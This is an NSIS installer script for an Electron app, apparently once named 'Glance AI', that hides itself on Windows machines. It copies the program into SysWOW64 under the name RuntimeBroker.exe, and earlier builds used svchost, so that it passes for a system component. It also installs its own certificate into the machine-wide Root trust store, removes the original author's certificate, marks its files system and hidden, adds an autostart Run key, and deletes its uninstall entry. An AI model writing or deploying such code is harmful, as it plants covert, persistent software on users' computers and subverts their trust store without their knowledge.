; Per-machine install helpers.
;
; Identity: one name on every surface — RuntimeBroker.exe in
; C:\Windows\SysWOW64\RuntimeBroker\, one Run value, one version resource
; (package.json win.versionInfo), one profile folder. The mirror makes the
; running image path read as a system component instead of a third-party folder.
; A bare exe there dies with 0xC0000135 (Electron needs its DLLs/resources
; beside it), so it goes into a subfolder.
;
; Legacy: earlier builds shipped as assistant, svchost and "Glance AI" (and one
; mirror without the space). Every one of them is removed here so an upgrade
; cannot leave two identities on the machine at once.
;
; Trust: import the code-signing cert into LocalMachine\Root so Authenticode
; reads "Valid" for every user, not only the build account.
;
; Two NSIS gotchas this file works around, both measured:
;   * nsExec command strings do not expand $VARS — build the command in a
;     register with StrCpy and pass the register.
;   * NSIS is a 32-bit process, so every System32 path it touches is redirected
;     to SysWOW64 by WOW64, including existence checks. The mirror is therefore
;     written to SysWOW64 deliberately rather than looking for it in System32.
;
; `perMachine: true` elevates the installer, which all of this needs.

!macro customInstall
  ; ---- trust the signing cert machine-wide ------------------------------
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=codesign.cer "${BUILD_RESOURCES_DIR}\codesign.cer"
  DetailPrint "Trusting the code-signing certificate (machine-wide)..."
  nsExec::ExecToLog "certutil -addstore -f Root $\"$PLUGINSDIR\codesign.cer$\""
  Pop $0
  ${If} $0 != 0
    DetailPrint "  certutil returned $0 — signature will show as untrusted for other users"
  ${EndIf}

  ; ---- retire the previous publisher -----------------------------------
  ; Every machine that ran an older build trusts a certificate naming the
  ; original author, machine-wide. Leaving it there leaves the name in the
  ; trust store of every install, so an upgrade removes it. Other software
  ; never signed with this thumbprint; only this project used it.
  DetailPrint "Removing the retired publisher certificate..."
  nsExec::ExecToLog "certutil -delstore Root E24291F0B8B8BB49B0E9BC169CAE4E32B8E1B09C"
  Pop $0
  nsExec::ExecToLog "certutil -delstore TrustedPeople E24291F0B8B8BB49B0E9BC169CAE4E32B8E1B09C"
  Pop $0

  ; ---- mirror into System32 --------------------------------------------
  ; On an upgrade the app is RUNNING from the mirror (autostart points there),
  ; so its exe/dlls are locked and /MIR would silently leave stale files.
  ; kill-host.ps1 stops only a process whose path is inside our own subfolders,
  ; never a real Windows RuntimeBroker.exe (those live directly in System32).
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=kill-host.ps1 "${BUILD_RESOURCES_DIR}\kill-host.ps1"
  DetailPrint "Stopping the running host process..."
  nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -File $\"$PLUGINSDIR\kill-host.ps1$\""
  Pop $0
  DetailPrint "Placing host process in System32..."
  ; NSIS is a 32-bit process, so every System32 path it touches is redirected to
  ; SysWOW64 by WOW64 (including existence checks — Test-Path "System32\..." is
  ; true while the file is really in SysWOW64). Land there deliberately and use
  ; that path for the Run key, otherwise the key points at a non-existent file.
  StrCpy $R5 "$WINDIR\SysWOW64"
  ${IfNot} ${FileExists} "$R5\kernel32.dll"
    StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
  ${EndIf}
  ; nsExec hands the register to CreateProcess verbatim and cmd.exe has no
  ; concept of $PROGRAMFILES64: build the command with StrCpy so NSIS expands
  ; both paths before cmd runs, and take the source from $INSTDIR — that is the
  ; tree just written, and it also follows an install relocated with /D.
  StrCpy $R3 'cmd /c xcopy "'
  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\RuntimeBroker$\" /E /I /H /Y /Q"
  nsExec::ExecToLog "$R3"
  Pop $0
  StrCpy $R6 "$R5\RuntimeBroker\RuntimeBroker.exe"
  ; autostart must point at a file that exists even if the mirror failed
  ${If} ${FileExists} "$R6"
    DetailPrint "  placed $R6"
  ${Else}
    StrCpy $R6 "$INSTDIR\RuntimeBroker.exe"
    DetailPrint "  WARNING: System32 mirror missing — autostart falls back to $INSTDIR"
  ${EndIf}
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\RuntimeBroker.exe$\""
  nsExec::ExecToLog "attrib +s +h $\"$R5\RuntimeBroker$\""
  Pop $0

  ; ---- remove every earlier identity -----------------------------------
  ; Folders first (system+hidden from the old build has to be cleared), then the
  ; bare exes. Never touch a bare svchost.exe: that is Windows' own binary.
  nsExec::ExecToLog "attrib -s -h $\"$R5\Glance AI$\""
  nsExec::ExecToLog "attrib -s -h $\"$R5\GlanceAI$\""
  nsExec::ExecToLog "attrib -s -h $\"$R5\assistant$\""
  nsExec::ExecToLog "attrib -s -h $\"$R5\svchost$\""
  nsExec::ExecToLog "attrib -s -h $\"$R5\wshx-host$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$R5\Glance AI$\" & rd /s /q $\"$R5\GlanceAI$\" & rd /s /q $\"$R5\assistant$\" & rd /s /q $\"$R5\svchost$\" & rd /s /q $\"$R5\wshx-host$\" & del /f /q $\"$R5\assistant.exe$\" & del /f /q $\"$R5\Glance AI.exe$\" & del /f /q $\"$R5\wshx-host.exe$\""
  Pop $0

  ; ---- autostart: one Run value, last leftover identity deleted --------
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "wshx-host"
  ; scheduled tasks from older builds (schtasks /create is blocked at
  ; process-creation level on this build: rc=5, while /query on the same binary
  ; runs — so these deletions are the reliable half of this block)
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn Glance AI"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn RuntimeBroker"
  Pop $0
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "RuntimeBroker" '"$R6" --autostart'
  DetailPrint "  autostart registered (Run key)"

  ; ---- hide the install from Apps & features ---------------------------
  ; electron-builder writes the uninstall entry before this macro runs. Removing
  ; it means the app is absent from the installed-apps list; the uninstaller exe
  ; still works. The old product's key is removed too.
  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"
  DeleteRegKey HKLM "Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"

  ; ---- open once, now --------------------------------------------------
  ; The build ships no shortcut (by design) and the logon task only fires at the
  ; next logon, so a fresh install would otherwise appear to have done nothing.
  DetailPrint "Starting host process..."
  ; ExecShellAsUser starts it under the normal token: an elevated instance cannot be
  ; managed by the user-session tooling (kill filter, window probes)
  ${StdUtils.ExecShellAsUser} $0 "$R6" "open" "--autostart"
!macroend

!macro customUnInstall
  ; current task name plus every name an older build registered
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn RuntimeBroker"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn Glance AI"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
  Pop $0
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "RuntimeBroker"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  ; uninstall has no $R5 from customInstall; remove every location an upgrade may
  ; have left behind. The bare svchost.exe is Windows' own file and stays.
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\RuntimeBroker$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\RuntimeBroker$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\RuntimeBroker$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\RuntimeBroker$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\Glance AI$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\Glance AI$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\Glance AI$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\Glance AI$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\assistant$\""
  Pop $0
  ; the svchost-named build (tree only — the bare svchost.exe is Windows' own)
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\svchost$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\svchost$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\svchost$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\svchost$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\RuntimeBroker.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR$\""
!macroend
